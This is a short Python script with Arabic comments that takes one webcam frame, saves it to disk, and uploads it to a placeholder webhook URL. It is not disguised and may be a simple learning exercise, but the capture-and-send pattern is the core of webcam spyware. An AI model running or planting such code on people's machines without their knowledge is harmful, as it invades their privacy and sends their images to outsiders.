import cv2 # عشان نفتح الكاميرا ونتلقط الصورة 
import requests # هي الي تخليها نرسل الصورة الى الوبيهوك

WEBHOOK_URL = "url" 
# حط رابط الويبهوك هنا 

cam = cv2.VideoCapture(0)
ret, frame = cam.read() # يقرا فريم واحد
cam.release() # يقفل الكاميرا

if not ret: #لو قراءة الكاميرا فشلت
    print("picture capture has failed")
    exit(1)

cv2.imwrite("shot.jpg", frame) #يحفظ الصورة على القرص

with open("shot.jpg", "rb") as f: #راح يفتح الصورة عشان يقراها
    files = {"file": ("shot.jpg", f, "image/jpeg")} #راح يجهزها كمُرفق
    r = requests.post(WEBHOOK_URL, files=files, timeout=15) #عشان يرسلها للويبهوك

print("sent successfully", r.status_code)
    